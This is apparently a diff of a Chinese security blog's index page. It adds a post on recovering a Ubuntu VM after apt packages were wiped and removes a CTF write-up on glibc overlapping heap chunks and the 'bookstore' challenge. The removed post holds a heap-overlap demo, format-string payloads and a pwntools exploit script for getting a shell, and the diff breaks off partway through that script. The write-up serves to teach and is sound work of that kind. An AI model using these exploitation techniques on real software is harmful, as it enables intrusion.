@@ -180,6 +180,90 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/01/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%AF%E5%88%A0apt%E5%8C%85%E5%90%8E%E7%9A%84%E9%87%8D%E6%96%B0%E6%81%A2%E5%A4%8D/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Coldshield">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Coldshiel's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/04/01/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%AF%E5%88%A0apt%E5%8C%85%E5%90%8E%E7%9A%84%E9%87%8D%E6%96%B0%E6%81%A2%E5%A4%8D/" class="post-title-link" itemprop="url">记录一次虚拟机误删apt包后的重新恢复</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-04-01 02:11:44 / Modified: 02:13:03" itemprop="dateCreated datePublished" datetime="2020-04-01T02:11:44-07:00">2020-04-01</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="记录一次apt包误删后的恢复"><a href="#记录一次apt包误删后的恢复" class="headerlink" title="记录一次apt包误删后的恢复"></a>记录一次apt包误删后的恢复</h1><p>昨天本来是换ubuntu16 py3环境的，可惜脑残从网上复制命令的时候可能有一句autoremove之类的东西？我所有ubuntu原生apt包全被删完，当时在用的时候只是发现终端坏了，gedit没有了，然后在终端还仅存的时候装上了，现在想想都后怕，要是当时没装上还得在那个黑洞洞的Xterm里面重装</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Coldshield/image_stored/image-20200401162540191.png" alt="image-20200401161311509"></p>
+<p>图形化界面全面崩盘，窗口也拖不动只有命令行和这个可怜的桌面上几个文件夹和我打交道（幸好终端滚动条还能用），开机可以正常开，不过此时可以看到网络是断开的：</p>
+<img src="https://cdn.jsdelivr.net/gh/Coldshield/image_stored/image-20200401162339042.png" alt="image-20200401162339042" style="zoom: 80%;">
+
+<h1 id="第一步：终端"><a href="#第一步：终端" class="headerlink" title="第一步：终端"></a>第一步：终端</h1><p>发现Ctrl+Alt+T没反应了，不清楚具体什么原因，但是右键桌面幸好还是可以开启terminal</p>
+<h1 id="第二步：网络"><a href="#第二步：网络" class="headerlink" title="第二步：网络"></a>第二步：网络</h1><p>首先我面临的问题不是命令使用不了了，正常命令我都可以使用，但是我需要的是用apt把这些包全都装回来</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Coldshield/image_stored/image-20200401162540191.png" alt="image-20200401162540191"></p>
+<p>直接ifconfig看的话就是这样的，下面是我的解决方案</p>
+<p><code>sudo /sbin/dhclient</code>(在这条命令之前好像还尝试启动了一些服务之类的，由于是操作到一半来记录的所以前面几条可能就没有了，不过这条是最有效的，因为使用了之后我直接就可以ping通DNS和baidu了，重启之后也是和上面显示的一样，但是直接使用这条命令的话就可以瞬间通网，神奇)</p>
+<p><code>sudo service network-manager start</code></p>
+<p><code>sudo gedit /etc/NetworkManager/NetworkManager.conf</code> 把最后一行的false改成true</p>
+<h1 id="第三步：开始琢磨apt包"><a href="#第三步：开始琢磨apt包" class="headerlink" title="第三步：开始琢磨apt包"></a>第三步：开始琢磨apt包</h1><h2 id="桌面apt包"><a href="#桌面apt包" class="headerlink" title="桌面apt包"></a>桌面apt包</h2><p>还是先<code>sudo apt update &amp;&amp; sudo apt upgrade</code></p>
+<p>之前换源的文件倒是没事，照样可用，但是upgrade的时候有内容不能fetch，所以先进行下面的操作</p>
+<p><code>sudo apt install compiz</code></p>
+<p><code>sudo apt install unity</code></p>
+<p><code>sudo apt install gdebi</code></p>
+<p><code>sudo apt install ubuntu-desktop</code></p>
+<p><code>sudo apt-get install --reinstall ubuntu-desktop</code>(这个reinstall是照着敲的，也没多想)</p>
+<p>然后这里还参考了知乎上的<a href="https://www.zhihu.com/question/41770698/answer/92270590" target="_blank" rel="noopener">这篇回答</a></p>
+<p>然后桌面系统就恢复正常了</p>
+<p>重新启动一切正常，Ctrl+Alt+T也可以使用了</p>
+<h2 id="其他apt包（可能会长期更新）"><a href="#其他apt包（可能会长期更新）" class="headerlink" title="其他apt包（可能会长期更新）"></a>其他apt包（可能会长期更新）</h2><p>暂无，只是之前还没完全崩盘时装了gnome-terminal还有gedit</p>
+<h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>之后因为系统报错所以我还执行了这两条命令，虽然不知道有没有用</p>
+<p>sudo service apport restart</p>
+<p>sudo systemctl restart apport</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/23/kernel%E5%85%A5%E9%97%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1579,335 +1663,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Coldshield">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Coldshiel's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/" class="post-title-link" itemprop="url">how2heap - overlapping_chunks&bookstore,night-deamonic-heap</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-02-17 20:04:10" itemprop="dateCreated datePublished" datetime="2020-02-17T20:04:10-08:00">2020-02-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-02-29 02:08:42" itemprop="dateModified" datetime="2020-02-29T02:08:42-08:00">2020-02-29</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="how2heap-overlapping-chunks-amp-bookstore-night-deamonic-heap"><a href="#how2heap-overlapping-chunks-amp-bookstore-night-deamonic-heap" class="headerlink" title="how2heap - overlapping_chunks&amp;bookstore,night-deamonic-heap"></a>how2heap - overlapping_chunks&amp;bookstore,night-deamonic-heap</h1><p>ubuntu16.04        libc2.23</p>
-<h1 id="overlapping-chunks-c"><a href="#overlapping-chunks-c" class="headerlink" title="overlapping_chunks.c"></a>overlapping_chunks.c</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> A simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThis is a simple chunks overlapping problem\n\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's start to allocate 3 chunks on the heap\n"</span>);</span><br><span class="line"></span><br><span class="line">	p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n"</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(p1, <span class="string">'1'</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p2, <span class="string">'2'</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow let's free the chunk p2\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"For a toy program, the value of the last 3 bits is unimportant;"</span></span><br><span class="line">		<span class="string">" however, it is best to maintain the stability of the heap.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"</span></span><br><span class="line">		<span class="string">" to assure that p1 is not mistaken for a free chunk.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line">	<span class="keyword">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n"</span>,</span><br><span class="line">		 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">	*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the "size" field of chunk p2</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow let's allocate another chunk with a size equal to the data\n"</span></span><br><span class="line">	       <span class="string">"size of the chunk p2 injected size\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This malloc will be served from the previously freed chunk that\n"</span></span><br><span class="line">	       <span class="string">"is parked in the unsorted bin which size has been modified by us\n"</span>);</span><br><span class="line">	p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4 has been allocated at %p and ends at %p\n"</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 starts at %p and ends at %p\n"</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 should overlap with p3, in this case p4 includes all p3.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"</span></span><br><span class="line">		<span class="string">" and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's run through an example. Right now, we have:\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIf we memset(p4, '4', %d), we have:\n"</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">memset</span>(p4, <span class="string">'4'</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nAnd if we then memset(p3, '3', 80), we have:\n"</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>一个比较简单的oevrflow的示例</p>
-<p>首先申请了3个chunk</p>
-<p>0x100（p1）<br>0x100（p2）<br>0x80（p3）</p>
-<p>当我们把0x100的chunk放入unsortedbin之后，模拟p1 overflow修改p2的size为0x180，再通过malloc(0x180-8)即可直接卸下unsortedbin中这个fake 0x180的chunk，达到overlap p3的目的</p>
-<p>由于比较简单这里就没放debug的过程，直接开始撸题吧2333</p>
-<h1 id="bookstore"><a href="#bookstore" class="headerlink" title="bookstore"></a>bookstore</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>程序比较简单</p>
-<img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581674823828.png" width="70%" height="70%">
-
-<p>上来先malloc了三个0x90的small chunk</p>
-<p>堆上的内容此时是这样的</p>
-<table>
-<thead>
-<tr>
-<th>order1</th>
-<th>order2</th>
-<th>malloc_dest</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0x90</td>
-<td>0x90</td>
-<td>0x90</td>
-</tr>
-</tbody></table>
-<h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581674900909.png" width="70%" height="70%">
-
-<p>下面就是一个循环+switch的结构，循环由v4控制，v4为1后结束循环</p>
-<p><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581675282813.png" alt="1581675282813"></p>
-<p>结束循环之后存在格式化字符串漏洞，fmt为malloc_dest</p>
-<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><p><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581675013218.png" alt="1581675013218"></p>
-<p>无长度检查，存在overflow，在输入的末尾<code>\n</code>处会改成<code>\x00</code></p>
-<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581675079810.png" alt="1581675079810"></p>
-<p>free就是单纯的free，没有清零指针</p>
-<h3 id="submit"><a href="#submit" class="headerlink" title="submit"></a>submit</h3><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581760790065.png" width="85%" height="85%">
-
-<p>就是用order1和order2的内容来填充submit_chunk</p>
-<h2 id="Exploite"><a href="#Exploite" class="headerlink" title="Exploite"></a>Exploite</h2><p>程序的chunk的是一开始就malloc好的，无法自己malloc，但是能自己free，当选择5之后可以malloc一个0x150大小的chunk，所以第一思路肯定是free chunk2后通过chunk1更改chunk2的size，然后申请submit_chunk时会返回chunk2的地址，由于submit_chunk比较大，会和malloc_dest形成overlapping，通过修改submit_chunk的内容，溢出到malloc_dest触发格式化字符串漏洞（这里选择时的s可以输入一个比较大的buffer，可以在buffer中填上指针来修改内容）。</p>
-<p>因为overlap之后的拷贝操作是先把chunk1的内容拷贝到chunk2，然后再把chunk2的内容加到chunk2后面，所以要计算偏移，具体计算如上图注释，想要malloc_dest刚好放置我们的格式化串我们只需要满足chunk1中有0x74个Byte的内容即可</p>
-<p>可是我找了一会之后发现，因为只能用一次格式化字符串，而且在之前也无法泄露，栈指针和libc都利用不了，只能用程序里面的，要么是GOT表，要么是其他可写的段，当然在这里我很自然的联想到了<code>.fini</code>段，这个段是程序结束之后要调用的函数指针，我可以修改它为main函数地址（不过只能利用一次），然后在修改<code>.fini</code>段的时候顺带把栈地址、libc地址一并泄露（只要到程序栈上找到就行）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload1=((<span class="string">'%'</span>+str(<span class="number">0xA39</span>)+<span class="string">'c%13$hn|%19$p|%31$p'</span>).ljust(<span class="number">0x74</span>,<span class="string">'a'</span>)).ljust(<span class="number">0x88</span>,<span class="string">'\x00'</span>)+<span class="string">'\x50\x01'</span></span><br><span class="line"><span class="comment">#下面的0x6011B8会放在%13$n处，%19$p是一个栈地址，%31$p是libc_start_main的返回地址，A39是main函数地址地位</span></span><br><span class="line">edit(<span class="number">1</span>,payload1)<span class="comment">#溢出修改size</span></span><br><span class="line"></span><br><span class="line">submit(<span class="number">0x6011B8</span>)<span class="comment">#选择时顺带填上地址，然后此时malloc的chunk就会overlap了</span></span><br></pre></td></tr></table></figure>
-
-<p>然后计算对应地址</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ret_stack=int(p.recv(<span class="number">14</span>),<span class="number">16</span>)<span class="number">-0x18</span><span class="comment">#stack address of ret</span></span><br><span class="line">libc_base=int(p.recv(<span class="number">15</span>).strip(<span class="string">'|'</span>),<span class="number">16</span>)<span class="number">-0x20830</span></span><br><span class="line">one=<span class="number">0x45216</span>+libc_base<span class="comment">#one_gadget</span></span><br></pre></td></tr></table></figure>
-
-<p>之后第二次利用与第一次相同，但是有一点，one_gaget的地址可能与第二次执行的返回地址有3个Byte不一样，那怎么办。所以第二次我们可以修改两次（为什么不是三次是因为三个字节的大小顺序可能会不一样，在使用<code>%hhn</code>写入的时候前面的输出会对后面产生影响，但是如果一次改两个字节<code>%hn</code>和一次改一个字节<code>%hn</code>就可以控制顺序了）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">change1=one&amp;<span class="number">0xffff</span></span><br><span class="line">change2=one&amp;<span class="number">0xff0000</span></span><br><span class="line">change2=change2&gt;&gt;<span class="number">16</span></span><br></pre></td></tr></table></figure>
-
-<p>printf时我们写入的地址在栈上的偏移需要自己计算一下，地址也需要计算一下，因为此时的栈已经变了，不过偏移是固定的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload1=((<span class="string">'%0'</span>+str(change2)+<span class="string">'d%14$hhn|%0'</span>+str(change1-change2<span class="number">-1</span>)+<span class="string">'d%13$hn|'</span>).ljust(<span class="number">0x74</span>,<span class="string">'a'</span>)).ljust(<span class="number">0x88</span>,<span class="string">'\x00'</span>)+<span class="string">'\x50\x01'</span></span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br><span class="line"></span><br><span class="line">submit(ret_stack<span class="number">-0x110</span>,ret_stack<span class="number">-0x110</span>+<span class="number">2</span>)<span class="comment">#submit时填上两个地址</span></span><br></pre></td></tr></table></figure>
-
-<p>最终getshell</p>
-<h2 id="完整Exp"><a href="#完整Exp" class="headerlink" title="完整Exp"></a>完整Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./books'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(x,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5: Submit\n'</span>)</span><br><span class="line">	p.sendline(str(x))</span><br><span class="line">	p.recvuntil(<span class="string">' order:\n'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5: Submit\n'</span>)</span><br><span class="line">	<span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">		p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.sendline(<span class="string">'4'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(address,address2=<span class="number">0</span>)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5: Submit\n'</span>)</span><br><span class="line">	p.sendline(p64(<span class="number">0x35</span>)+p64(address)+p64(address2))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload1=((<span class="string">'%'</span>+str(<span class="number">0xA39</span>)+<span class="string">'c%13$hn|%19$p|%31$p'</span>).ljust(<span class="number">0x74</span>,<span class="string">'a'</span>)).ljust(<span class="number">0x88</span>,<span class="string">'\x00'</span>)+<span class="string">'\x50\x01'</span></span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br><span class="line"></span><br><span class="line">submit(<span class="number">0x6011B8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'|'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'|'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'|'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'|'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'|'</span>)</span><br><span class="line">ret_stack=int(p.recv(<span class="number">14</span>),<span class="number">16</span>)<span class="number">-0x18</span></span><br><span class="line">libc_base=int(p.recv(<span class="number">15</span>).strip(<span class="string">'|'</span>),<span class="number">16</span>)<span class="number">-0x20830</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> +<span class="string">'ret_stack:'</span>+hex(ret_stack)+<span class="string">'\nlibc_base:'</span>+hex(libc_base)+ <span class="string">"\033[0m"</span>)</span><br><span class="line">one=<span class="number">0x45216</span>+libc_base</span><br><span class="line"></span><br><span class="line">change1=one&amp;<span class="number">0xffff</span></span><br><span class="line">change2=one&amp;<span class="number">0xff0000</span></span><br><span class="line">change2=change2&gt;&gt;<span class="number">16</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> +<span 